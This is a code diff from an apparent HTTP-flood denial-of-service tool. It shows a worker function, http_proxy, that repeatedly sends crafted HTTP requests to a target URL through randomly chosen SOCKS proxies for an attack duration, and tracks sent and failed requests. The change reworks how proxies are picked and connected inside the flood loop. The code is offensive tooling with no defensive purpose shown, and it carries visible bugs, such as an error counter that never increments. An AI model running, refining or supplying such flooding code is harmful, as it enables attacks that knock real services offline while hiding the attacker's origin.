@@ -275,21 +275,13 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
     while time.time() < stoptime and Core.attackrunning:
         try:
             s = socks.socksocket()
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
-            s.settimeout(3)
+            #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            #s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
+            s.settimeout(4)
 
             if port == 443: # ssl
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s,server_hostname=host)
-
-            proxip, proxport = choice(Core.proxy_pool).split(':')
-
-            try: s.set_proxy(proto, proxip, int(proxport))
-            except: Core.proxy_pool.delete(f'{proxip}:{proxport}'); continue
-
-            try: s.connect( (host, int(port) ))
-            except: continue # skip
 
             # build packet
             headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
@@ -297,18 +289,24 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
 
             errcount = 0
             while Core.attackrunning: # run while we should attack
-                if errcount >= 40: # 40 failed requests, gay
-                    break # switch to new proxy
+                if errcount >= 40:
+                    Core.proxy_pool.delete(f'{proxip}:{proxport}'); break
 
                 try: 
+                    proxip, proxport = choice(Core.proxy_pool).split(':')
+
+                    s.set_proxy(proto, proxip, int(proxport))
+                    s.connect( (host, int(port) ))
+
                     s.send( packet )
                     Core.infodict[worker_id]['req_sent'] += 1
                 except Exception:
                     errcount+1
                     Core.infodict[worker_id]['req_fail'] += 1
+
                 Core.infodict[worker_id]['req_total'] += 1
 
-        except Exception:
+        except Exception as e:
             Core.infodict[worker_id]['req_fail'] += 1
     Core.threadcount -= 1
     
